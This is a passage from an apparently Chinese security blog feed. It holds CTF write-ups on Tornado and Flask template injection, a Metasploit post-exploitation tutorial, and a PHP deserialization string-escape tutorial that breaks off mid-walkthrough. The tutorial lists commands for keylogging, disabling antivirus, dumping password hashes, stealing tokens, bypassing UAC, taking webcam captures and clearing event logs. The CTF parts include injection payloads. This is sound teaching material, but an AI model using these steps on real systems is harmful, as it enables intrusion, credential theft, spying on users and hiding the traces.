class="hljs-keyword">value</span>)：返回一个数值的绝对值。示例：<span class="hljs-number">-1</span>|abslast(<span class="hljs-keyword">value</span>)：返回一个序列的最后一个元素。示例：names|last。length(<span class="hljs-keyword">value</span>)：返回一个序列或者字典的长度。示例：names|length。<span class="hljs-keyword">join</span>(<span class="hljs-keyword">value</span>,d=u<span class="hljs-string">&#x27;&#x27;</span>)：将一个序列用d这个参数的值拼接成字符串。<span class="hljs-type">int</span>(<span class="hljs-keyword">value</span>)：将值转换为<span class="hljs-type">int</span>类型。<span class="hljs-type">float</span>(<span class="hljs-keyword">value</span>)：将值转换为<span class="hljs-type">float</span>类型。lower(<span class="hljs-keyword">value</span>)：将字符串转换为小写。upper(<span class="hljs-keyword">value</span>)：将字符串转换为小写</code></pre><h6 id="2018护网杯easy-tornado"><a class="header-anchor" href="#2018护网杯easy-tornado">🍭</a>2018护网杯easy_tornado</h6><p>tornado是python中的一个web应用框架。题目有三个文件：</p><blockquote><p>flag.txt</p><blockquote><p><code>flag in /fllllllllllllag</code></p></blockquote></blockquote><blockquote><p>welcome.txt</p><blockquote><p><code>render</code></p><p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>render函数介绍</p></blockquote></blockquote><blockquote><p>hints.txt</p><p><code>md5(cookie_secret+md5(filename))</code></p><p>分析url：<code>http://2ee77311-baf5-428b-9c3a-d86c6be03d0e.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=319862cec4f48911760eba1295bf83f5</code></p><p>filehash=md5(cookie_secret+md5(filename))<br>现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p></blockquote><p>在读取文件失败链接中发现ssti漏洞：</p><p><img src="/2021/04/05/wei/7.jpg" alt="7"></p><p>测试发现一些字符被过滤</p><pre><code class="hljs 1c"><span class="hljs-string">&quot; % &#x27; () * - /=[\]_|</span></code></pre><p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，可以参考<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax">Tornado官方文档</a></p><p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现<code>self.application.settings</code>有一个别名<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">requesthandler.settings</a></p><p><img src="/2021/04/05/wei/13.png" alt="13"></p><p><em>handler指向的处理当前这个页面的RequestHandler对象，RequestHandler.settings指向self.application.settings，因此handler.settings指向RequestHandler.application.settings。</em></p><p>构造payload:</p><p><img src="/2021/04/05/wei/8.jpg" alt="8"></p><p>计算<code>filehash</code>:</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">s</span>):</span><span class="hljs-function"> <span class="hljs-variable">md5</span> = <span class="hljs-variable">hashlib.md5</span>() </span><span class="hljs-function"> <span class="hljs-variable">md5.update</span>(<span class="hljs-variable">s.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) </span><span class="hljs-function"> <span class="hljs-variable">return</span> <span class="hljs-variable">md5.hexdigest</span>()</span> <span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">filehash</span>():</span><span class="hljs-function"> <span class="hljs-variable">filename</span> = <span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span></span><span class="hljs-function"> <span class="hljs-variable">cookie_secret</span> = <span class="hljs-string">&#x27;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&#x27;</span></span><span class="hljs-function"> <span class="hljs-title">print</span>(<span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>)))</span> <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>: <span class="hljs-function"><span class="hljs-title">filehash</span>()</span></code></pre><p>成功，这个题目发现模板注入后的一个关键考点在于<code>handler.settings</code>。这个是Tornado框架本身提供给程序员可快速访问的配置文件对象之一。</p><h6 id="WesternCTF2018-shrine"><a class="header-anchor" href="#WesternCTF2018-shrine">🍭</a>[WesternCTF2018]shrine</h6><p>分析代码：</p><p><img src="/2021/04/05/wei/10.png" alt="10"></p><p>在没有黑名单的时候，可以传入 config，或<code>&#123; &#123;self._*dict_*&#125; &#125;</code>获取，但当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。在shrine路径下使用<code>&#123; &#123;url_for.__globlas__&#125; &#125;</code>查看</p><p><img src="/2021/04/05/wei/11.jpg" alt="11"></p><p><code>current_app</code>是全局变量代理，查看他的<code>config</code>即可</p><p><img src="/2021/04/05/wei/12.jpg" alt="12"></p><p>也可用<strong>get_flashed_messages</strong>：</p><pre><code class="hljs isbl">返回之前在<span class="hljs-variable">Flask</span>中通过 <span class="hljs-function"><span class="hljs-title">flash</span>() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 <span class="hljs-title">get_flashed_messages</span>(</span></code></pre><p>此类题目思路:</p><blockquote><p>查阅相关框架的文档</p><p>使用<code>dir</code>内省<code>locals</code>对象来查看所有能够使用的模板上下文</p><p>使用dir深入内省所有对象</p><p>直接分析框架源码</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>metasploit（二）——后渗透测试</title>
    <link href="/2021/03/05/wei2/"/>
    <url>/2021/03/05/wei2/</url>
    
    <content type="html"><![CDATA[<p>今天来学习一下后渗透测试</p><h2 id="meterpreter"><a class="header-anchor" href="#meterpreter">🍭</a>meterpreter</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，在溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后返回一个控制通道（作为攻击载荷获得目标系统的Meterpreter shell的链接）Meterpreter shell有很多功能：添加用户、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息……且Meterpreter能够躲避入侵检测系统，简化任务创建多个会话。可以来利用这些会话进行渗透。<strong>meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</strong></p><h4 id="Meterpreter优势"><a class="header-anchor" href="#Meterpreter优势">🍭</a>Meterpreter优势</h4><ul><li>纯内存工作模式，不需要对磁盘进行任何写入操作。</li><li>使用加密通信协议，而且可以同时与几个信道通信。</li><li>在被攻击进程内工作，不需要创建新的进程。</li><li>易于在多进程之间迁移。</li><li>平台通用，适用于Windows、Linux、BSD系统，支持Intel x86和Intelx64</li></ul><h4 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span> <span class="hljs-string">帮助菜单</span><span class="hljs-attr">channel</span> <span class="hljs-string">显示动态频道的信息</span><span class="hljs-attr">close</span> <span class="hljs-string">关闭一个频道</span><span class="hljs-attr">exit</span> <span class="hljs-string">终止meterpreter会话</span><span class="hljs-attr">help</span> <span class="hljs-string">帮助菜单</span><span class="hljs-attr">interact</span> <span class="hljs-string">频道交互</span><span class="hljs-attr">irb</span> <span class="hljs-string">IRB脚本模式</span><span class="hljs-attr">migrate</span>  <span class="hljs-string">pid  转移meterpreter到其他进程</span><span class="hljs-attr">quit</span> <span class="hljs-string">终止meterpreter</span><span class="hljs-attr">read</span> <span class="hljs-string">从频道读数据</span><span class="hljs-attr">run</span> <span class="hljs-string">执行一个meterpreter脚本</span><span class="hljs-attr">use</span> <span class="hljs-string">加载一个或多个扩展</span><span class="hljs-attr">write</span> <span class="hljs-string">向频道写数据</span><span class="hljs-attr">background</span>  <span class="hljs-string">放回后台</span><span class="hljs-attr">getlwd</span>  <span class="hljs-string">查看本地目录</span><span class="hljs-attr">lcd</span>  <span class="hljs-string">切换本地目录</span><span class="hljs-attr">search</span> <span class="hljs-string">-d c:  -f *.doc  搜索文件</span><span class="hljs-attr">run</span> <span class="hljs-string">post/windows/capture/keylog_recorder   键盘记录</span><span class="hljs-attr">use</span> <span class="hljs-string">priv  加载特权模块</span><span class="hljs-attr">getsystem</span>  <span class="hljs-string">提升到SYSTEM权限</span><span class="hljs-attr">steal_token</span> <span class="hljs-string">&lt;PID&gt;  窃取令牌</span><span class="hljs-attr">rev2self</span>  <span class="hljs-string">恢复原来的令牌 </span><span class="hljs-attr">run</span> <span class="hljs-string">killav  关闭杀毒软件 </span><span class="hljs-attr">run</span> <span class="hljs-string">getgui-e  启用远程桌面</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span><span class="hljs-attr">run</span> <span class="hljs-string">get_local_subnets  获取内网网段信息</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -s &lt;内网网段&gt;  创建自动路由</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -p  查看自动路由表</span><span class="hljs-attr">sessions</span> <span class="hljs-string">-l 查看会话</span><span class="hljs-attr">网络命令：</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">发送一个本地端口到一个远程服务</span><span class="hljs-attr">route</span> <span class="hljs-string">查看和修改路由表</span><span class="hljs-attr">系统命令：</span><span class="hljs-attr">clearev</span> <span class="hljs-string">清除事件日志</span><span class="hljs-attr">execute</span> <span class="hljs-string">执行一个命令</span><span class="hljs-attr">getpid</span> <span class="hljs-string">取得当前进程ID</span><span class="hljs-attr">getuid</span> <span class="hljs-string">取得服务器运行用户</span><span class="hljs-attr">kill</span> <span class="hljs-string">杀死一个进程</span><span class="hljs-attr">ps</span> <span class="hljs-string">列出进程列表</span><span class="hljs-attr">reboot</span> <span class="hljs-string">重启远程计算机</span><span class="hljs-attr">reg</span> <span class="hljs-string">修改远程注册表</span><span class="hljs-attr">rev2self</span> <span class="hljs-string">在远程机器调用RevertToSelf()</span><span class="hljs-attr">shell</span> <span class="hljs-string">返回一个cmdshell</span><span class="hljs-attr">shutdown</span> <span class="hljs-string">关闭远程系统</span><span class="hljs-attr">sysinfo</span> <span class="hljs-string">取得远程系统的信息</span><span class="hljs-attr">用户接口命令：</span><span class="hljs-attr">enumdesktops</span> <span class="hljs-string">列出所有访问桌面和windows工作站</span><span class="hljs-attr">idletime</span> <span class="hljs-string">远程用户闲置时间</span><span class="hljs-attr">keyscan_dump</span> <span class="hljs-string">转存击键缓存</span><span class="hljs-attr">keyscan_start</span> <span class="hljs-string">开始捕捉击键</span><span class="hljs-attr">keyscan_stop</span> <span class="hljs-string">停止捕捉击键</span><span class="hljs-attr">setdesktop</span> <span class="hljs-string">转移另一个工作站桌面</span><span class="hljs-attr">uictl</span> <span class="hljs-string">用户接口控制</span><span class="hljs-attr">webcam_stream</span> <span class="hljs-string">开启摄像头</span><span class="hljs-attr">screenshot</span>  <span class="hljs-string">截屏</span><span class="hljs-attr">密码数据库命令：</span><span class="hljs-attr">hashdump</span> <span class="hljs-string">SAM转储</span><span class="hljs-attr">时间戳命令：</span><span class="hljs-attr">timestomp</span> <span class="hljs-string">修改文件时间戳</span></code></pre><h3 id="测试"><a class="header-anchor" href="#测试">🍭</a>测试</h3><p>后渗透测试是建立在成功对目标机器攻击渗透后，故进入meterpreter模块前需在攻击机和目标机之间建立一个shell（不再赘述，按(一)里那样操作）</p><p><img src="/2021/03/05/wei2/1.jpg" alt="1"></p><p>这次利用的是PHP GCI参数执行漏洞。</p><h4 id="进程迁移"><a class="header-anchor" href="#进程迁移">🍭</a>进程迁移</h4><p>在刚获得Meterpreter Shell时，该Shell极其脆弱和易受攻击的，攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭。所以第一步就是要移动这个Shell，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h5 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h5><p>先<code>ps</code>获取目标机正在运行的进程:</p><img src="/2021/03/05/wei2/ps.jpg" alt="ps" style="zoom: 67%;"><p>再用<code>migrate [pid]</code>命令将shell移动到对应的pid的进程里，进程迁移完原本的shell进程会自动关闭，若无自动关闭可用<code>kill [pid]</code>命令关掉该进程</p><h5 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h5><p>使用<code>run post/linux/manage/migrate</code>命令，系统会自动寻找合适的进程迁移。</p><h4 id="收集系统信息"><a class="header-anchor" href="#收集系统信息">🍭</a>收集系统信息</h4><blockquote><p><code>sysinfo</code>查询信息</p><p><code>run post/linux/gather/checkvm</code>查询目标机是否在虚拟机上运行</p><p><code>idletime</code>查看虚拟机最近运行时间</p><p><code>route</code>查看目标机完整的网络设置</p><p><code>getuid</code>查看已经渗透的用户名</p><p><code>run post/linux/manage/killav</code>关闭杀毒软件</p></blockquote><h4 id="借助被攻击的主机对其它网络进行攻击"><a class="header-anchor" href="#借助被攻击的主机对其它网络进行攻击">🍭</a>借助被攻击的主机对其它网络进行攻击</h4><blockquote><p>先<code>run post/linux/manage/enable_rdp</code>启动远程桌面协议（3389端口）</p><p>再用<code>run post/linux/manage/autoroute</code>查看目标机本地子网</p><p>然后用<code>route add xxx</code>命令添加路由，xxx的值由本地子网中信息决定(在此之前先<code>background</code>将终端隐藏在后台)添加成功后可用<code>route print</code>查看</p></blockquote><h4 id="抓取各种信息"><a class="header-anchor" href="#抓取各种信息">🍭</a>抓取各种信息</h4><blockquote><p>接着用<code>run post/linux/gather/enum_logged_on_users</code>列举登录在目标机上的用户</p><p>再用<code>run post/linux/gather/enum_application</code>列举安装在目标机上的应用</p><p>当用户将某应用设为自动登录时用<code>run windows/gather/credentials/windows_autologin</code>可抓取用户名和密码</p><p>截屏:用<code>screenshot</code>或<code>load espia(加载插件)+screengrab</code></p><p>检查是否有摄像头<code>webcam list</code></p><p>打开摄像头拍照：<code>webcam_snap</code></p><p>开启直播模式<code>webcan_stream</code></p></blockquote><h2 id="提权"><a class="header-anchor" href="#提权">🍭</a>提权</h2><p>通常只获得系统的Guest或User权限无法进行获取Hash、安装软件、修改防火墙规则和修改注册表等各种操作，所以必须将访问权限从Guset提升到User,再到Administrator，最后到System级别。<br>渗透的最终目的是获取服务器的最高权限。</p><p>提升权限的方式：<br>纵向提权：低权限角色获得高权限角色的权限。<br>横向提权：获取同级别角色的权限。</p><h4 id="利用漏洞提权"><a class="header-anchor" href="#利用漏洞提权">🍭</a>利用漏洞提权</h4><blockquote><p>先查看当前权限:<code>whoami/groups</code></p><p>直接<code>getsystem</code>提权,但一般会失败</p><p>查看补丁:<code>sysinfo</code>即可(也可以用wmic查看)</p><p>接下来找提权的EXP，将系统已经安装的补丁编号与提权的EXP编号进行对比，使用没有编号的EXP进行提权,如果用最新的MS16-032(本地溢出漏洞)来尝试提权，对应编号是KB3139914(可在安全焦点或者<code>Exploit-DB</code>查询漏洞的具体信息)</p><p>然后将meterpreter转到后台,搜索MS16-032漏洞,指定session进行提权即可</p></blockquote><h4 id="绕过uac-用户账户控制-提权"><a class="header-anchor" href="#绕过uac-用户账户控制-提权">🍭</a>绕过uac(用户账户控制)提权</h4><p>因为win7以上版本电脑含有UAC,故getsystem提权时一般会失败</p><h5 id="使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC"><a class="header-anchor" href="#使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC">🍭</a>使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC</h5><ul><li><code>use exploit/windows/local/ask</code></li><li>set session 1</li></ul><h5 id="使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell"><a class="header-anchor" href="#使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell">🍭</a>使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell</h5><ul><li><code>use exploit/windows/local/bypassuac</code>or<code>use exploit/windows/local/bypassuac</code></li><li>set session 1</li></ul><h2 id="令牌窃取"><a class="header-anchor" href="#令牌窃取">🍭</a>令牌窃取</h2><p>token之前介绍过了,这里做个补充</p><p>令牌种类:</p><ul><li><p>访问令牌(Access Token)表示访问控制操作主题的系统对象</p></li><li><p>密保令牌(Security token),又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备</p></li><li><p>会话令牌(Session Token)是交互会话中唯一的身份标识符</p></li></ul><h4 id="Kerberos协议"><a class="header-anchor" href="#Kerberos协议">🍭</a>Kerberos协议</h4><p><img src="/2021/03/05/wei2/1.png" alt="1"></p><h4 id="步骤"><a class="header-anchor" href="#步骤">🍭</a>步骤</h4><blockquote><p>先<code>use incognito</code>加载功能</p><p>再<code>list_tokens -u </code> 列出目标主机用户的可用令牌</p><blockquote><p>一般有两种类型的令牌：</p><p><code>Delegation Tokens</code>(授权令牌)支持交互式登录</p><p><code>Impersonation Tokens</code>(模拟令牌),非交互的会话</p><p>令牌的数量取决于Meterpreter Shell的访问级别</p></blockquote></blockquote><blockquote><p>从得到的信息中可以看到有效令牌其格式为<code>主机名\登录的用户名</code></p><p>调用<code>impersonate_token HOSTNAME\\USERNAME </code> 假冒目标主机上的可用令牌</p><p>假冒成功🌞🌞🌞</p></blockquote><h4 id="清除事件日志"><a class="header-anchor" href="#清除事件日志">🍭</a>清除事件日志</h4><p>完成攻击操作之后使用命令“clearev”命令清除事件日志</p><h2 id="HASH攻击"><a class="header-anchor" href="#HASH攻击">🍭</a>HASH攻击</h2><h4 id="hashdump"><a class="header-anchor" href="#hashdump">🍭</a>hashdump</h4><p>Hashdump Meterpreter脚本可以从目标机器中提取Hash值，破解Hash值即可获得登录密码。计算机中的每个账号的用户名和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有“系统级”账号。所以要使用该命令就必须进行权限的提升。</p><ul><li><code>hashdump</code>(只能在system级权限下)</li><li><code>smart_hashdump</code>模块,<strong>在window中因为有UAC故要先绕过它</strong></li></ul><h4 id="Quarks-PwDump"><a class="header-anchor" href="#Quarks-PwDump">🍭</a>Quarks PwDump</h4><p>在Windows系统中，密码以加密的方式保存在/windows/system32cm下的sam文件里，账号在登录后会将密码的密文和明文保存在系统的内存中。情况下系统启动后，sam文件是不能被读取的，但PwDump可以.</p><p>参数:</p><blockquote><p>-dhl：导出本地哈希值。<br>-dhdc：导出内存中的域控哈希值。<br>-dhd：导出域控哈希值，必须指定NTDS文件。<br>-db：导出Bitlocker信息，必须指定NTDS文件。<br>-nt：导出NTDS文件。<br>-hist:导出历史信息，可选项。<br>-t：可选导出类型，默认导出John类型。<br>-0：导出文件到本地。</p></blockquote><h4 id="Windows-Credentials-Editor"><a class="header-anchor" href="#Windows-Credentials-Editor">🍭</a>Windows Credentials Editor</h4><p>WCE能列举登录会话，添加、改变和删除相关凭据(例如LM/NT Hash)。这些功能在内网渗透中能够被利用,但必须在管理员权限下使用，还要注意杀毒工具的免杀。</p><blockquote><p>先用<code>upload/root/wce.exe c:\</code>命令将wce.exe上传到目标主机C盘中</p><p>然后在目标机Shell下用<code>wce-w</code>提取系统明文管理员的密码</p></blockquote><p>参数:</p><blockquote><p>-l   读取数据格式<code>username:domain:lm：ntlm</code>(从内存中读取已经登录的信息,默认的读取方式是先用安的方式读取，若读取失败再用不安全的方式，</p><p>-f   强制使用安全的方式读取</p><p>-g  计算密码，制定一个系统明文会使用的加密方法来计算密文</p><p>-c  指定会话执行cmd</p><p>-v  显示详细信息</p><p>-w  查看已登录的明文密码</p><p>-s  更改当前登录会话的NTLM凭据。参数:&lt;用户名&gt;:&lt;域名&gt;:&lt; LMHash &gt;: &lt; NTHash &gt;</p><p>-r  无限期地列出登录会话和NTLM凭证。如果发现新的会话，每5秒刷新一次;可选:- r &lt;刷新间隔&gt;</p><p>-e  无限期地列出登录会话NTLM凭证。每次发生登录事件时刷新</p><p>-o  将所有输出保存到文件中。参数:&lt;文件名&gt;</p><p>-i  指定LUID而不是使用当前登录会话。参数:&lt; luid &gt;</p><p>-d  从登录会话中删除NTLM凭证。参数:&lt; luid &gt;</p></blockquote><p>科普完成☀️☀️☀️</p><p>参考:</p><p>《web安全攻防渗透测试实战指南》</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106311397">https://blog.csdn.net/smli_ng/article/details/106311397</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化（二）——字符串逃逸</title>
    <link href="/2021/03/03/wei3/"/>
    <url>/2021/03/03/wei3/</url>
    
    <content type="html"><![CDATA[<h3 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h3><blockquote><p><strong>php在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。</strong></p><blockquote><p>超出的部分并不会被反序列化成功，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且反序列化字符串都是以<code>&quot;;&#125;</code>结束的，那如果把<code>&quot;;&#125;</code>添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了</p></blockquote></blockquote><blockquote><p><strong>长度不对应的时候会报错</strong></p><blockquote><p>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败<br><img src="/2021/03/03/wei3/1.png" alt="1"></p></blockquote></blockquote><blockquote><p><strong>可以反序列化类中不存在的元素</strong></p></blockquote><h3 id="类型"><a class="header-anchor" href="#类型">🍭</a>类型</h3><h4 id="过滤后字符变多"><a class="header-anchor" href="#过滤后字符变多">🍭</a>过滤后字符变多</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lemon</span>(<span class="hljs-params">$string</span>)</span>&#123;$lemon = <span class="hljs-string">&#x27;/p/i&#x27;</span>;<span class="hljs-keyword">return</span> preg_replace($lemon,<span class="hljs-string">&#x27;ww&#x27;</span>,$string);&#125;$username = $_GET[<span class="hljs-string">&#x27;a&#x27;</span>];$age = <span class="hljs-string">&#x27;20&#x27;</span>;$user = <span class="hljs-keyword">array</span>($username,$age);var_dump(serialize($user));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$r = lemon(serialize($user));var_dump($r);var_dump(unserialize($r));<span class="hljs-meta">?&gt;</span></code></pre><p>输入apple</p><p><img src="/2021/03/03/wei3/2.jpg" alt="2"></p><p>apple中两个<code>p</code>被替换成四个<code>w</code>,但是长度并没有变化，根据反序列化的特点，指定的长度错误则反序列化就会失败。借这个过滤，可以去修改age的值。原来序列化后<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>长度为16，当输入一个<code>p</code>会替换成<code>ww</code>，所以如果输入16个p，那么会生成32个的<code>w</code>，所以如果我们输入16个p再加上构造的相同位数的<code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code>，恰好是32位，即：</p><p><img src="/2021/03/03/wei3/3.jpg" alt="3"></p><p>在过滤后的序列化时会被32个w全部填充，从而使构造的代码 <code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code> 成功逃逸，修改了age的值，而原来的那<code>&quot;;i:1;s:2:&quot;20&quot;;&#125;</code>则被忽略了（<strong>反序列化字符串都是以<code>&quot;;&#125;</code>结束的</strong>)，我们传入的<code>&quot;;i:1;s:2:&quot;30&quot;;&#125;</code>已经在前面成功闭合了</p><h4 id="过滤后字符变少"><a class="header-anchor" href="#过滤后字符变少">🍭</a>过滤后字符变少</h4><p>实验环境代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params">$string</span>)</span>&#123;<span class="hljs-keyword">return</span> preg_replace( <span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, $string);&#125;$test[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];$test[<span class="hljs-string">&#x27;sign&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;sign&#x27;</span>]; $test[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.$fake[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.$fake[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.$fake[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>随意输入</p><p><img src="/2021/03/03/wei3/4.jpg" alt="4"></p><p>number的值被固定，在str_rep函数中如果检测到’php’,'test’关键字就把其替换为空,那么就利用这一点,我们故意输入敏感字符,替换为空之后来实现字符逃逸.(注意考虑闭合问题)构造payload：<code>name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code></p><p><img src="/2021/03/03/wei3/6.png" alt="6"></p><h4 id="例题"><a class="header-anchor" href="#例题">🍭</a>例题</h4><h5 id="0CTF-2016-piapiapia（过滤后字符增多）"><a class="header-anchor" href="#0CTF-2016-piapiapia（过滤后字符增多）">🍭</a>[0CTF 2016]piapiapia（过滤后字符增多）</h5><p>dirsearch扫描目录发现几个PHP文件，其中config.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$config[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;$config[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;$config[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$config[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$flag = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>我们可以考虑把config.php中的数据读出来，因为config.php里面是服务器搭建环境的时候设置的参数，用户需要在config.php里面设置自己本地数据库的用户名和密码，所以这个文件一定也设置了自己本地的$flag的值，从网站程序入口文件index.php审计，如下代码所示当完成登录验证后会跳转到profile.php</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;header(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">else</span> &#123;die(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);&#125;</code></pre><p>在profile.php中如果没有存入过用户的详细信息将会跳转到update.php去上传信息，反之将直接读取该用户的详细信息并显示到当前页面中</p><pre><code class="hljs php">$profile=$user-&gt;show_profile($username);<span class="hljs-keyword">if</span>($profile  == <span class="hljs-literal">null</span>) &#123;header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);&#125;<span class="hljs-keyword">else</span> &#123;$profile = unserialize($profile);$phone = $profile[<span class="hljs-string">&#x27;phone&#x27;</span>];$email = $profile[<span class="hljs-string">&#x27;email&#x27;</span>];$nickname = $profile[<span class="hljs-string">&#x27;nickname&#x27;</span>];$photo = base64_encode(file_get_contents($profile[<span class="hljs-string">&#x27;photo&#x27;</span>]));  <span class="hljs-comment">//把文件读入一个字符串，突破口</span></code></pre><p>让 <code>$profile[‘photo’]</code>的值为<code>“config.php”</code>即可,由<code>$nickname = $profile['nickname'];</code>可知需将nickname值设为config.php,但是<code>$profile['photo']</code>的值无法修改，由<code>$profile = unserialize($profile)</code>可知它的值由反序列得到，我们再跟进一下update.php，发现以下两个有利用点的代码段：</p><p><img src="/2021/03/03/wei3/7.png" alt="7"></p><pre><code class="hljs php">$user-&gt;update_profile($username, serialize($profile));<span class="hljs-comment">//此处出现了序列化</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> serialize($profile);&#125;</code></pre><p>继续跟进到<code>update_profile()</code>函数</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params">$username, $new_profile</span>) </span>&#123;$username = <span class="hljs-built_in">parent</span>::filter($username);$new_profile = <span class="hljs-built_in">parent</span>::filter($new_profile);$where = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span 